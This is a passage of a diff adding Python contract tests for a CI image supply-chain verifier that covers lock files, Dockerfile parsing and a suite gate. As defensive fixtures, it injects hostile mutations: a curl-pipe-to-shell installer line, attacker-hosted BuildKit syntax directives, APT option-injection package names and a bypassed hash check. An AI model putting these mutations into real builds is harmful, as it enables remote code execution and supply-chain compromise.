@@ -78,6 +78,20 @@ class ImageManifestContractTest(unittest.TestCase):
             digest = created.stdout.strip()
             self.assertRegex(digest, r"^[0-9a-f]{64}$")
             self.assertEqual(digest_sidecar.read_text(encoding="utf-8"), digest + "\n")
+            manifest_value = json.loads(manifest.read_text(encoding="utf-8"))
+            image_lock = json.loads(
+                (REPO_ROOT / "ci/locks/ci-image-lock.json").read_text(
+                    encoding="utf-8"
+                )
+            )
+            self.assertEqual(
+                manifest_value["protected_helpers"], image_lock["protected_helpers"]
+            )
+            manifest_paths = {
+                record["path"] for record in manifest_value["inputs"]
+            }
+            self.assertIn("ci/scripts/ci_image_install.sh", manifest_paths)
+            self.assertIn("ci/scripts/integration_suite_gate.py", manifest_paths)
             run_command(
                 "python3", SCRIPTS / "ci_image_manifest.py", "verify",
                 "--source-commit", COMMIT_A,
@@ -3973,6 +3987,119 @@ class RulesetContractTest(unittest.TestCase):
             self.assertTrue(any(call[-1].endswith("/rulesets/31") for call in calls))
 
 
+class IntegrationSuiteGateContractTest(unittest.TestCase):
+    """Exercise the protected suite gate as an actual process boundary."""
+
+    @staticmethod
+    def _load_gate_module() -> object:
+        """Load the protected gate helper for its canonical result inventory."""
+        module_path = SCRIPTS / "integration_suite_gate.py"
+        specification = importlib.util.spec_from_file_location(
+            "integration_suite_gate_contract", module_path
+        )
+        if specification is None or specification.loader is None:
+            raise AssertionError("cannot load integration suite gate")
+        module = importlib.util.module_from_spec(specification)
+        specification.loader.exec_module(module)
+        return module
+
+    @classmethod
+    def _successful_environment(
+        cls, publish: str = "false"
+    ) -> dict[str, str]:
+        """Return the complete successful result/attestation environment."""
+        module = cls._load_gate_module()
+        environment = {
+            variable: "success" for _, variable in module.REQUIRED_RESULTS
+        }
+        environment.update(
+            {
+                "CI_ATTESTATION_RESULT": (
+                    "success" if publish == "true" else "skipped"
+                ),
+                "CI_IMAGE_DIGEST": IMAGE_DIGEST,
+                "CI_PUBLISH_REUSABLE_ATTESTATIONS": publish,
+            }
+        )
+        return environment
+
+    def _run_gate(
+        self,
+        output: Path,
+        environment: dict[str, str],
+        *,
+        expect_success: bool,
+    ) -> subprocess.CompletedProcess[str]:
+        """Execute the real gate CLI against one retained temporary output."""
+        return run_command(
+            "python3",
+            SCRIPTS / "integration_suite_gate.py",
+            "--output",
+            output,
+            environment=environment,
+            expect_success=expect_success,
+        )
+
+    def test_gate_writes_only_after_complete_readonly_or_publishing_success(self) -> None:
+        """Accept exact attest success/skip pairs and append one digest output."""
+        for publish in ("false", "true"):
+            with self.subTest(publish=publish), tempfile.TemporaryDirectory() as text:
+                output = Path(text) / "github-output"
+                output.write_text("", encoding="utf-8")
+                self._run_gate(
+                    output,
+                    self._successful_environment(publish),
+                    expect_success=True,
+                )
+                self.assertEqual(
+                    output.read_text(encoding="utf-8"),
+                    f"validated_image_digest={IMAGE_DIGEST}\n",
+                )
+
+    def test_every_required_result_and_attestation_drift_fails_without_output(self) -> None:
+        """Reject failed, skipped, or unknown required results and trust drift."""
+        module = self._load_gate_module()
+        for job_name, variable in module.REQUIRED_RESULTS:
+            for result in ("failure", "failed", "skipped", "unknown"):
+                with self.subTest(job=job_name, result=result), tempfile.TemporaryDirectory() as text:
+                    output = Path(text) / "github-output"
+                    output.write_text("", encoding="utf-8")
+                    environment = self._successful_environment()
+                    environment[variable] = result
+                    completed = self._run_gate(
+                        output, environment, expect_success=False
+                    )
+                    self.assertIn(job_name, completed.stderr)
+                    self.assertEqual(output.read_text(encoding="utf-8"), "")
+
+        attestation_cases = (
+            ("true", "skipped"),
+            ("true", "unknown"),
+            ("false", "success"),
+            ("false", "failure"),
+            ("unknown", "skipped"),
+        )
+        for publish, attestation in attestation_cases:
+            with self.subTest(
+                publish=publish, attestation=attestation
+            ), tempfile.TemporaryDirectory() as text:
+                output = Path(text) / "github-output"
+                output.write_text("", encoding="utf-8")
+                environment = self._successful_environment()
+                environment["CI_PUBLISH_REUSABLE_ATTESTATIONS"] = publish
+                environment["CI_ATTESTATION_RESULT"] = attestation
+                self._run_gate(output, environment, expect_success=False)
+                self.assertEqual(output.read_text(encoding="utf-8"), "")
+
+        with tempfile.TemporaryDirectory() as text:
+            output = Path(text) / "github-output"
+            output.write_text("", encoding="utf-8")
+            environment = self._successful_environment()
+            environment["CI_IMAGE_DIGEST"] = "sha256:invalid"
+            self._run_gate(output, environment, expect_success=False)
+            self.assertEqual(output.read_text(encoding="utf-8"), "")
+
+
 class LockSurfaceContractTest(unittest.TestCase):
     """Exercise the complete active protected lock/workflow verifier."""
 
@@ -4032,6 +4159,78 @@ class LockSurfaceContractTest(unittest.TestCase):
             )
         return workflow[:start] + block.replace(original, replacement, 1) + workflow[end:]
 
+    @staticmethod
+    def _write_image_fixture(
+        root: Path,
+        *,
+        dockerfile: str,
+        image_lock: dict[str, object],
+        package_lock: str,
+        snapshot_source: str,
+        installer: str,
+        suite_gate: str,
+    ) -> None:
+        """Materialize one complete protected image-input fixture.
+
+        Args:
+            root: Empty temporary fixture root.
+            dockerfile: Active Dockerfile variant.
+            image_lock: Strict image lock variant.
+            package_lock: Exact Ubuntu package lock variant.
+            snapshot_source: Canonical Deb822 source variant.
+            installer: Protected Bash installer variant.
+            suite_gate: Protected Python suite-gate variant.
+
+        Returns:
+            None after copying every canonical image input and overwriting the
+            explicit variants under test.
+
+        Raises:
+            AssertionError: The input inventory is malformed.
+
+        Note:
+            Copying the full locked inventory makes `_verify_image_lock` and
+            `_verify_dockerfile` exercise the same regular-file boundary as the
+            production repository rather than a partial fixture shortcut.
+        """
+        input_paths = image_lock.get("input_paths")
+        if not isinstance(input_paths, list) or not all(
+            isinstance(path, str) for path in input_paths
+        ):
+            raise AssertionError("fixture image input inventory is malformed")
+        for relative in input_paths:
+            source_path = REPO_ROOT / relative
+            destination = root / relative
+            destination.parent.mkdir(parents=True, exist_ok=True)
+            shutil.copy2(source_path, destination)
+        (root / "Dockerfile.ci").write_text(dockerfile, encoding="utf-8")
+        (root / "ci/locks/ci-image-lock.json").write_text(
+            json.dumps(image_lock, indent=2, sort_keys=True) + "\n",
+            encoding="utf-8",
+        )
+        (root / "ci/locks/ubuntu-24.04-packages.lock").write_text(
+            package_lock, encoding="utf-8"
+        )
+        (root / "ci/locks/ubuntu-24.04-snapshot.sources.in").write_text(
+            snapshot_source, encoding="utf-8"
+        )
+        (root / "ci/scripts/ci_image_install.sh").write_text(
+            installer, encoding="utf-8"
+        )
+        (root / "ci/scripts/integration_suite_gate.py").write_text(
+            suite_gate, encoding="utf-8"
+        )
+
+    @staticmethod
+    def _rebind_helper_hash(
+        image_lock: dict[str, object], helper_name: str, source: str
+    ) -> dict[str, object]:
+        """Return a deep-copied lock with one attacker-recomputed helper hash."""
+        rebound = json.loads(json.dumps(image_lock))
+        helpers = rebound["protected_helpers"]
+        helpers[helper_name]["sha256"] = hashlib.sha256(source.encode()).hexdigest()
+        return rebound
+
     def test_reusable_permission_ceiling_is_structurally_isolated(self) -> None:
         """Accept three exact callers and reject every inheritance/elevation drift."""
         module = self._load_lock_module()
@@ -4081,10 +4280,10 @@ class LockSurfaceContractTest(unittest.TestCase):
             (
                 "execution-write",
                 "shared",
-                "security-darwin",
+                "sanitizer-asan-darwin",
                 "      contents: read\n",
                 "      contents: write\n",
-                "job security-darwin read-only permissions differ",
+                "job sanitizer-asan-darwin read-only permissions differ",
             ),
             (
                 "attestation-local-permissions",
@@ -4128,6 +4327,1061 @@ class LockSurfaceContractTest(unittest.TestCase):
                 )
                 with self.assertRaises(module.ContractError) as raised:
                     module._verify_reusable_workflow_permissions(root)
+                self.assertIn(diagnostic, str(raised.exception))
+
+    def test_ci_image_producer_complete_mapping_rejects_every_drift(self) -> None:
+        """Reject producer trigger, permission, build, tag, and step drift."""
+        module = self._load_lock_module()
+        actions = module._read_actions(REPO_ROOT / "ci/locks/actions.lock")
+        module._verify_ci_image_producer(REPO_ROOT, actions)
+        producer_path = REPO_ROOT / ".github/workflows/build-ci-image.yml"
+        producer = producer_path.read_text(encoding="utf-8")
+        build_action = (
+            "docker/build-push-action@"
+            f"{actions['docker/build-push-action'][1]}"
+        )
+        cases = (
+            (
+                "deleted-prebuild-verifier",
+                (
+                    "      - name: Verify protected locks\n"
+                    "        run: python3 ci/scripts/ci_lock_verify.py\n\n"
+                ),
+                "",
+            ),
+            (
+                "second-shell-build",
+                "      - name: Attest exact temporary OCI subject\n",
+                (
+                    "      - name: Unexpected second Docker build\n"
+                    "        run: docker buildx build --push --tag "
+                    "ghcr.io/example/ci:second .\n\n"
+                    "      - name: Attest exact temporary OCI subject\n"
+                ),
+            ),
+            (
+                "second-build-action",
+                "      - name: Attest exact temporary OCI subject\n",
+                (
+                    "      - name: Unexpected second Buildx action\n"
+                    f"        uses: {build_action} # v6\n"
+                    "        with:\n"
+                    "          context: .\n"
+                    "          push: true\n"
+                    "          tags: ghcr.io/example/ci:second\n\n"
+                    "      - name: Attest exact temporary OCI subject\n"
+                ),
+            ),
+            (
+                "pre-suite-latest-write",
+                "      - name: Attest exact temporary OCI subject\n",
+                (
+                    "      - name: Premature latest write\n"
+                    "        run: docker buildx imagetools create --tag "
+                    "ghcr.io/example/ci:latest ghcr.io/example/ci@sha256:deadbeef\n\n"
+                    "      - name: Attest exact temporary OCI subject\n"
+                ),
+            ),
+            (
+                "buildkit-syntax-argument",
+                "          build-args: |\n",
+                (
+                    "          build-args: |\n"
+                    "            BUILDKIT_SYNTAX=attacker/frontend:latest\n"
+                ),
+            ),
+            (
+                "apt-snapshot-argument",
+                "          build-args: |\n",
+                (
+                    "          build-args: |\n"
+                    "            APT_SNAPSHOT=19700101T000000Z\n"
+                ),
+            ),
+            (
+                "verifier-continue-on-error",
+                "        run: python3 ci/scripts/ci_lock_verify.py\n",
+                (
+                    "        run: python3 ci/scripts/ci_lock_verify.py\n"
+                    "        continue-on-error: true\n"
+                ),
+            ),
+            (
+                "conditional-build",
+                "        id: push\n",
+                "        id: push\n        if: always()\n",
+            ),
+            (
+                "build-extra-environment",
+                f"        uses: {build_action} # v6\n",
+                (
+                    f"        uses: {build_action} # v6\n"
+                    "        env:\n"
+                    "          APT_SNAPSHOT: 19700101T000000Z\n"
+                ),
+            ),
+            (
+                "build-does-not-push",
+                "          push: true\n",
+                "          push: false\n",
+            ),
+            (
+                "additional-tag",
+                "          tags: ${{ steps.caller.outputs.temporary_image }}\n",
+                (
+                    "          tags: |\n"
+                    "            ${{ steps.caller.outputs.temporary_image }}\n"
+                    "            ghcr.io/example/ci:latest\n"
+                ),
+            ),
+            (
+                "workflow-call-input-downgrade",
+                "        required: true\n",
+                "        required: false\n",
+            ),
+            (
+                "producer-package-permission-downgrade",
+                "  packages: write\n",
+                "  packages: read\n",
+            ),
+            (
+                "additional-job",
+                "          retention-days: 7\n",
+                (
+                    "          retention-days: 7\n"
+                    "  shadow-build:\n"
+                    "    runs-on: ubuntu-24.04\n"
+                    "    steps:\n"
+                    "      - run: docker buildx build .\n"
+                ),
+            ),
+        )
+        for label, original, replacement in cases:
+            with self.subTest(
+                producer_drift=label
+            ), tempfile.TemporaryDirectory() as temporary_text:
+                self.assertEqual(producer.count(original), 1)
+                root = Path(temporary_text)
+                workflow_root = root / ".github/workflows"
+                workflow_root.mkdir(parents=True)
+                (workflow_root / "build-ci-image.yml").write_text(
+                    producer.replace(original, replacement, 1), encoding="utf-8"
+                )
+                with self.assertRaises(module.ContractError) as raised:
+                    module._verify_ci_image_producer(root, actions)
+                self.assertIn(
+                    "complete CI-image producer mapping differs",
+                    str(raised.exception),
+                )
+
+    def test_package_lock_names_and_apt_argv_are_option_safe(self) -> None:
+        """Require Debian package names and positional post-``--`` APT argv."""
+        module = self._load_lock_module()
+        module._verify_packages(
+            REPO_ROOT / "ci/locks/ubuntu-24.04-packages.lock"
+        )
+        positive_rows = sorted(
+            ("aa=1", "ca-certificates=1", "openssl=1"),
+            key=lambda value: value.encode("utf-8"),
+        )
+        with tempfile.TemporaryDirectory() as temporary_text:
+            package_path = Path(temporary_text) / "packages.lock"
+            package_path.write_text("\n".join(positive_rows) + "\n", encoding="utf-8")
+            self.assertEqual(
+                module._verify_packages(package_path),
+                {"aa": "1", "ca-certificates": "1", "openssl": "1"},
+            )
+
+        invalid_tokens = (
+            "--allow-unauthenticated=true",
+            "-ofoo=1",
+            ".hidden=1",
+            "-hidden=1",
+            "a=1",
+        )
+        for token in invalid_tokens:
+            with self.subTest(
+                invalid_package_token=token
+            ), tempfile.TemporaryDirectory() as temporary_text:
+                package_path = Path(temporary_text) / "packages.lock"
+                rows = sorted(
+                    (token, "ca-certificates=1", "openssl=1"),
+                    key=lambda value: value.encode("utf-8"),
+                )
+                package_path.write_text("\n".join(rows) + "\n", encoding="utf-8")
+                with self.assertRaises(module.ContractError) as raised:
+                    module._verify_packages(package_path)
+                self.assertIn("invalid exact package lock", str(raised.exception))
+
+        with tempfile.TemporaryDirectory() as temporary_text:
+            root = Path(temporary_text)
+            shim = root / "apt_argv.py"
+            shim.write_text(
+                "import json\nimport sys\nprint(json.dumps(sys.argv[1:]))\n",
+                encoding="utf-8",
+            )
+            completed = subprocess.run(
+                [
+                    "xargs",
+                    sys.executable,
+                    str(shim),
+                    "install",
+                    "-y",
+                    "--no-install-recommends",
+                    "--",
+                ],
+                input="normal-package\nname=version\n",
+                text=True,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                check=True,
+            )
+            self.assertEqual(
+                json.loads(completed.stdout),
+                [
+                    "install",
+                    "-y",
+                    "--no-install-recommends",
+                    "--",
+                    "normal-package",
+                    "name=version",
+                ],
+            )
+
+    def test_buildkit_unicode_space_predicate_and_marker_boundary(self) -> None:
+        """Match Go White_Space exactly without widening the marker boundary.
+
+        The table covers every code point accepted by Go ``unicode.IsSpace``
+        and adjacent/non-Go controls that Python ``str.isspace`` may accept.
+        Directive recognition is also anchored to a byte-zero comment marker.
+        """
+        module = self._load_lock_module()
+        go_white_space = {
+            0x0009,
+            0x000A,
+            0x000B,
+            0x000C,
+            0x000D,
+            0x0020,
+            0x0085,
+            0x00A0,
+            0x1680,
+            *range(0x2000, 0x200B),
+            0x2028,
+            0x2029,
+            0x202F,
+            0x205F,
+            0x3000,
+        }
+        for code_point in sorted(go_white_space):
+            with self.subTest(go_white_space=f"U+{code_point:04X}"):
+                self.assertTrue(module._go_unicode_is_space(chr(code_point)))
+
+        non_go_space = (
+            0x0008,
+            0x000E,
+            0x001C,
+            0x001D,
+            0x001E,
+            0x001F,
+            0x0084,
+            0x0086,
+            0x009F,
+            0x00A1,
+            0x167F,
+            0x1681,
+            0x1FFF,
+            0x200B,
+            0x2027,
+            0x202A,
+            0x202E,
+            0x2030,
+            0x205E,
+            0x2060,
+            0x2FFF,
+            0x3001,
+        )
+        for code_point in non_go_space:
+            with self.subTest(non_go_space=f"U+{code_point:04X}"):
+                self.assertFalse(module._go_unicode_is_space(chr(code_point)))
+
+        with self.assertRaises(module.ContractError):
+            module._go_unicode_is_space("")
+        with self.assertRaises(module.ContractError):
+            module._go_unicode_is_space("  ")
+
+        frontend = "attacker.example/frontend:latest"
+        for prefix in (" ", "\t"):
+            with self.subTest(marker_leading_space=repr(prefix)):
+                self.assertIsNone(
+                    module._buildkit_syntax_directive(
+                        f"{prefix}# syntax={frontend}\nFROM scratch\n"
+                    )
+                )
+
+    def test_dockerfile_physical_lines_follow_go_scan_lines(self) -> None:
+        """Keep frontend and active parsing on one LF-only line authority.
+
+        Normal LF/CRLF input, a terminal CR, and CRLF continuations remain
+        valid. Every non-LF separator stays inside the preceding comment token,
+        so it cannot expose the canonical installer ``RUN`` to the verifier
+        when BuildKit would still treat that text as comment content.
+        """
+        module = self._load_lock_module()
+        self.assertEqual(module._go_scan_lines(""), [])
+        self.assertEqual(module._go_scan_lines("\n"), [""])
+        self.assertEqual(
+            module._go_scan_lines("alpha\r\nbeta\r"), ["alpha", "beta"]
+        )
+        self.assertEqual(
+            module._go_scan_lines("RUN one \\\r\n    two\r"),
+            ["RUN one \\", "    two"],
+        )
+
+        dockerfile = (REPO_ROOT / "Dockerfile.ci").read_text(encoding="utf-8")
+        image_lock_value = json.loads(
+            (REPO_ROOT / "ci/locks/ci-image-lock.json").read_text(encoding="utf-8")
+        )
+        package_lock = (
+            REPO_ROOT / "ci/locks/ubuntu-24.04-packages.lock"
+        ).read_text(encoding="utf-8")
+        snapshot_source = (
+            REPO_ROOT / "ci/locks/ubuntu-24.04-snapshot.sources.in"
+        ).read_text(encoding="utf-8")
+        installer = (REPO_ROOT / "ci/scripts/ci_image_install.sh").read_text(
+            encoding="utf-8"
+        )
+        suite_gate = (
+            REPO_ROOT / "ci/scripts/integration_suite_gate.py"
+        ).read_text(encoding="utf-8")
+
+        valid_newline_forms = (
+            ("lf", dockerfile),
+            ("crlf", dockerfile.replace("\n", "\r\n")),
+            ("terminal-cr", dockerfile.removesuffix("\n") + "\r"),
+        )
+        for label, valid_dockerfile in valid_newline_forms:
+            with self.subTest(
+                valid_dockerfile_lines=label
+            ), tempfile.TemporaryDirectory() as temporary_text:
+                root = Path(temporary_text)
+                self._write_image_fixture(
+                    root,
+                    dockerfile=valid_dockerfile,
+                    image_lock=image_lock_value,
+                    package_lock=package_lock,
+                    snapshot_source=snapshot_source,
+                    installer=installer,
+                    suite_gate=suite_gate,
+                )
+                module._verify_dockerfile(root)
+
+        comment = (
+            "# Docker invokes it once; its full bytes and active statement "
+            "stream are locked."
+        )
+        installer_run = "RUN bash /tmp/ci-image-install.sh"
+        canonical_boundary = f"{comment}\n{installer_run}"
+        self.assertEqual(dockerfile.count(canonical_boundary), 1)
+        non_lf_separators = (
+            ("cr-only", "\r"),
+            ("vertical-tab", "\u000b"),
+            ("form-feed", "\u000c"),
+            ("file-separator", "\u001c"),
+            ("group-separator", "\u001d"),
+            ("record-separator", "\u001e"),
+            ("next-line", "\u0085"),
+            ("line-separator", "\u2028"),
+            ("paragraph-separator", "\u2029"),
+            ("unit-separator-adjacent", "\u001f"),
+        )
+        for label, separator in non_lf_separators:
+            with self.subTest(
+                non_lf_separator=label
+            ), tempfile.TemporaryDirectory() as temporary_text:
+                joined_line = f"{comment}{separator}{installer_run}"
+                self.assertEqual(module._go_scan_lines(joined_line), [joined_line])
+                mutated_dockerfile = dockerfile.replace(
+                    canonical_boundary, joined_line, 1
+                )
+                root = Path(temporary_text)
+                self._write_image_fixture(
+                    root,
+                    dockerfile=mutated_dockerfile,
+                    image_lock=image_lock_value,
+                    package_lock=package_lock,
+                    snapshot_source=snapshot_source,
+                    installer=installer,
+                    suite_gate=suite_gate,
+                )
+                with self.assertRaises(module.ContractError) as raised:
+                    module._verify_dockerfile(root)
+                self.assertIn(
+                    "canonical active instruction stream differs",
+                    str(raised.exception),
+                )
+
+    def test_image_installer_and_docker_surface_reject_every_drift(self) -> None:
+        """Reject every unapproved Docker/helper command and lock mutation.
+
+        The frontend fixtures model BuildKit's BOM and first-line shebang
+        preprocessing without resolving any declared frontend. This keeps the
+        regression deterministic and ensures the reviewer reproduction reaches
+        syntax detection rather than being hidden by the shebang comment.
+        """
+        module = self._load_lock_module()
+        module._verify_dockerfile(REPO_ROOT)
+        dockerfile = (REPO_ROOT / "Dockerfile.ci").read_text(encoding="utf-8")
+        image_lock_value = json.loads(
+            (REPO_ROOT / "ci/locks/ci-image-lock.json").read_text(encoding="utf-8")
+        )
+        package_lock = (
+            REPO_ROOT / "ci/locks/ubuntu-24.04-packages.lock"
+        ).read_text(encoding="utf-8")
+        snapshot_source = (
+            REPO_ROOT / "ci/locks/ubuntu-24.04-snapshot.sources.in"
+        ).read_text(encoding="utf-8")
+        installer = (REPO_ROOT / "ci/scripts/ci_image_install.sh").read_text(
+            encoding="utf-8"
+        )
+        suite_gate = (
+            REPO_ROOT / "ci/scripts/integration_suite_gate.py"
+        ).read_text(encoding="utf-8")
+        bootstrap = image_lock_value["apt_bootstrap"]
+        bootstrap_hash = bootstrap["ca_certificates"]["sha256"]
+        bootstrap_url = bootstrap["ca_certificates"]["url"]
+        snapshot = image_lock_value["apt_snapshot"]
+        openssl_version = bootstrap["openssl"]["version"]
+        cases = (
+            (
+                "docker-does-not-call-installer",
+                "dockerfile",
+                "RUN bash /tmp/ci-image-install.sh\n",
+                "RUN true\n",
+                "canonical active instruction stream differs",
+            ),
+            (
+                "docker-comment-forges-installer-call",
+                "dockerfile",
+                "RUN bash /tmp/ci-image-install.sh\n",
+                "# RUN bash /tmp/ci-image-install.sh\nRUN true\n",
+                "canonical active instruction stream differs",
+            ),
+            (
+                "bootstrap-hash-drift",
+                "dockerfile",
+                bootstrap_hash,
+                "0" * 64,
+                "canonical active instruction stream differs",
+            ),
+            (
+                "extra-unhashed-remote-add",
+                "dockerfile",
+                "# The minimal Ubuntu base has no TLS trust bundle.",
+                (
+                    "ADD https://snapshot.ubuntu.com/ubuntu/20260825T000000Z/"
+                    "pool/main/c/ca-certificates/ca-certificates_"
+                    "20260601~24.04.1_all.deb /tmp/unknown.deb\n\n"
+                    "# The minimal Ubuntu base has no TLS trust bundle."
+                ),
+                "canonical active instruction stream differs",
+            ),
+            (
+                "commented-locked-from-active-alpine",
+                "dockerfile",
+                (
+                    "FROM ubuntu:24.04@sha256:"
+                    "33ceb71981b602c1a7443a53469e4dba065f7503eab3078a2d7a57a2ab987517\n"
+                ),
+                (
+                    "# FROM ubuntu:24.04@sha256:"
+                    "33ceb71981b602c1a7443a53469e4dba065f7503eab3078a2d7a57a2ab987517\n"
+                    "FROM alpine:3.22\n"
+                ),
+                "canonical active instruction stream differs",
+            ),
+            (
+                "bootstrap-version-differs-from-package-lock",
+                "package-lock",
+                f"openssl={openssl_version}",
+                f"openssl={openssl_version}.mismatch",
+                "OpenSSL bootstrap version differs from the package lock",
+            ),
+            (
+                "bootstrap-snapshot-url-drift",
+                "image-lock-url",
+                bootstrap_url,
+                bootstrap_url.replace(f"/{snapshot}/", "/19700101T000000Z/"),
+                "CA bootstrap URL is not the locked snapshot package",
+            ),
+            (
+                "snapshot-template-omitted-from-image-manifest",
+                "image-lock-input",
+                "ci/locks/ubuntu-24.04-snapshot.sources.in",
+                "",
+                "canonical APT source is absent from image inputs",
+            ),
+            (
+                "snapshot-template-live-host",
+                "snapshot-source",
+                "https://snapshot.ubuntu.com/ubuntu/@APT_SNAPSHOT@/",
+                "http://ports.ubuntu.com/ubuntu-ports/",
+                "canonical signed snapshot source differs",
+            ),
+        )
+        for label, owner, original, replacement, diagnostic in cases:
+            with self.subTest(
+                image_contract_drift=label
+            ), tempfile.TemporaryDirectory() as temporary_text:
+                root = Path(temporary_text)
+                mutated_dockerfile = dockerfile
+                mutated_image_lock = json.loads(json.dumps(image_lock_value))
+                mutated_package_lock = package_lock
+                mutated_snapshot_source = snapshot_source
+                if owner == "dockerfile":
+                    self.assertEqual(mutated_dockerfile.count(original), 1)
+                    mutated_dockerfile = mutated_dockerfile.replace(
+                        original, replacement, 1
+                    )
+                elif owner == "package-lock":
+                    self.assertEqual(mutated_package_lock.count(original), 1)
+                    mutated_package_lock = mutated_package_lock.replace(
+                        original, replacement, 1
+                    )
+                elif owner == "snapshot-source":
+                    self.assertEqual(mutated_snapshot_source.count(original), 1)
+                    mutated_snapshot_source = mutated_snapshot_source.replace(
+                        original, replacement, 1
+                    )
+                elif owner == "image-lock-url":
+                    encoded = json.dumps(mutated_image_lock)
+                    self.assertEqual(encoded.count(original), 1)
+                    mutated_image_lock = json.loads(
+                        encoded.replace(original, replacement, 1)
+                    )
+                elif owner == "image-lock-input":
+                    paths = mutated_image_lock["input_paths"]
+                    self.assertEqual(paths.count(original), 1)
+                    paths.remove(original)
+                else:
+                    raise AssertionError(f"unknown image fixture owner: {owner}")
+                self._write_image_fixture(
+                    root,
+                    dockerfile=mutated_dockerfile,
+                    image_lock=mutated_image_lock,
+                    package_lock=mutated_package_lock,
+                    snapshot_source=mutated_snapshot_source,
+                    installer=installer,
+                    suite_gate=suite_gate,
+                )
+                with self.assertRaises(module.ContractError) as raised:
+                    if label == "snapshot-template-omitted-from-image-manifest":
+                        actions = module._read_actions(root / "ci/locks/actions.lock")
+                        module._verify_image_lock(root, actions)
+                    else:
+                        module._verify_dockerfile(root)
+                self.assertIn(diagnostic, str(raised.exception))
+
+        installer_mutations = (
+            (
+                "absolute-apt-before-source",
+                "  sed \"s/@APT_SNAPSHOT@/$APT_SNAPSHOT/g\" \\\n",
+                "  /usr/bin/apt-get update\n"
+                "  sed \"s/@APT_SNAPSHOT@/$APT_SNAPSHOT/g\" \\\n",
+            ),
+            (
+                "extra-curl-pipe-shell",
+                "  curl --fail --location --proto '=https' --tlsv1.2 \\\n",
+                "  curl https://example.invalid/install | sh\n"
+                "  curl --fail --location --proto '=https' --tlsv1.2 \\\n",
+            ),
+            (
+                "github-cli-hash-check-bypassed",
+                "    | sha256sum --check --strict -\n",
+                "    | true\n",
+            ),
+            (
+                "github-cli-url-drift",
+                "https://github.com/cli/cli/releases/download/",
+                "https://example.invalid/cli/",
+            ),
+            (
+                "early-success-exit",
+                "  sed \"s/@APT_SNAPSHOT@/$APT_SNAPSHOT/g\" \\\n",
+                "  exit 0\n"
+                "  sed \"s/@APT_SNAPSHOT@/$APT_SNAPSHOT/g\" \\\n",
+            ),
+            (
+                "required-main-not-called",
+                'ci_image_install_main "$@"\n',
+                ":\n",
+            ),
+            (
+                "comment-forges-apt",
+                "  apt-get update\n",
+                "  # apt-get update\n  :\n",
+            ),
+        )
+        for label, original, replacement in installer_mutations:
+            with self.subTest(
+                installer_semantic_drift=label
+            ), tempfile.TemporaryDirectory() as temporary_text:
+                self.assertEqual(installer.count(original), 1)
+                mutated_installer = installer.replace(original, replacement, 1)
+                rebound_lock = self._rebind_helper_hash(
+                    image_lock_value, "ci-image-installer", mutated_installer
+                )
+                root = Path(temporary_text)
+                self._write_image_fixture(
+                    root,
+                    dockerfile=dockerfile,
+                    image_lock=rebound_lock,
+                    package_lock=package_lock,
+                    snapshot_source=snapshot_source,
+                    installer=mutated_installer,
+                    suite_gate=suite_gate,
+                )
+                with self.assertRaises(module.ContractError) as raised:
+                    module._verify_dockerfile(root)
+                self.assertIn(
+                    "installer active statement identity differs",
+                    str(raised.exception),
+                )
+
+        suite_helper_mutations = (
+            (
+                "gate-noop",
+                '    for job_name, variable in REQUIRED_RESULTS:\n',
+                '    return environment.get("CI_IMAGE_DIGEST", "")\n'
+                '    for job_name, variable in REQUIRED_RESULTS:\n',
+            ),
+            (
+                "gate-early-success",
+                "    arguments = build_parser().parse_args()\n",
+                "    return 0\n"
+                "    arguments = build_parser().parse_args()\n",
+            ),
+            (
+                "gate-extra-statement",
+                "    arguments = build_parser().parse_args()\n",
+                "    print('unexpected gate statement')\n"
+                "    arguments = build_parser().parse_args()\n",
+            ),
+        )
+        for label, original, replacement in suite_helper_mutations:
+            with self.subTest(
+                suite_helper_semantic_drift=label
+            ), tempfile.TemporaryDirectory() as temporary_text:
+                self.assertEqual(suite_gate.count(original), 1)
+                mutated_gate = suite_gate.replace(original, replacement, 1)
+                rebound_lock = self._rebind_helper_hash(
+                    image_lock_value, "integration-suite-gate", mutated_gate
+                )
+                root = Path(temporary_text)
+                self._write_image_fixture(
+                    root,
+                    dockerfile=dockerfile,
+                    image_lock=rebound_lock,
+                    package_lock=package_lock,
+                    snapshot_source=snapshot_source,
+                    installer=installer,
+                    suite_gate=mutated_gate,
+                )
+                with self.assertRaises(module.ContractError) as raised:
+                    module._verify_dockerfile(root)
+                self.assertIn(
+                    "suite-gate executable syntax identity differs",
+                    str(raised.exception),
+                )
+
+        with tempfile.TemporaryDirectory() as temporary_text:
+            root = Path(temporary_text)
+            mutated_installer = installer + "# comment-only byte drift\n"
+            self._write_image_fixture(
+                root,
+                dockerfile=dockerfile,
+                image_lock=image_lock_value,
+                package_lock=package_lock,
+                snapshot_source=snapshot_source,
+                installer=mutated_installer,
+                suite_gate=suite_gate,
+            )
+            with self.assertRaises(module.ContractError) as raised:
+                module._verify_dockerfile(root)
+            self.assertIn("bytes differ from the lock", str(raised.exception))
+
+        syntax_directives = (
+            "# syntax=attacker.example/frontend:latest\n",
+            (
+                "# syntax=attacker.example/frontend@sha256:"
+                + "0" * 64
+                + "\n"
+            ),
+            "# SyNtAx = attacker.example/frontend:latest\n",
+            "#\tsyntax= attacker.example/frontend:latest\n",
+            "#\u0085syntax=attacker.example/frontend:latest\n",
+            "#\u00a0syntax=attacker.example/frontend:latest\n",
+            "#\u2003syntax=attacker.example/frontend:latest\n",
+            "#\u200asyntax=attacker.example/frontend:latest\n",
+            "#\u2028syntax=attacker.example/frontend:latest\n",
+            "#\u2029syntax=attacker.example/frontend:latest\n",
+            "#\u202fsyntax=attacker.example/frontend:latest\n",
+            "#\u3000syntax=attacker.example/frontend:latest\n",
+            "# syntax=attacker.example/frontend:latest --frontend-opt\n",
+            "// syntax=attacker.example/frontend:latest\n",
+        )
+        for directive in syntax_directives:
+            with self.subTest(
+                forbidden_syntax_directive=directive.encode(
+                    "unicode_escape"
+                ).decode("ascii")
+            ), tempfile.TemporaryDirectory() as temporary_text:
+                root = Path(temporary_text)
+                self._write_image_fixture(
+                    root,
+                    dockerfile=directive + dockerfile,
+                    image_lock=image_lock_value,
+                    package_lock=package_lock,
+                    snapshot_source=snapshot_source,
+                    installer=installer,
+                    suite_gate=suite_gate,
+                )
+                with self.assertRaises(module.ContractError) as raised:
+                    module._verify_dockerfile(root)
+                self.assertIn(
+                    "Docker syntax parser directive is forbidden",
+                    str(raised.exception),
+                )
+
+        with tempfile.TemporaryDirectory() as temporary_text:
+            root = Path(temporary_text)
+            self._write_image_fixture(
+                root,
+                dockerfile=(
+                    json.dumps(
+                        {"syntax": "attacker.example/frontend:latest"},
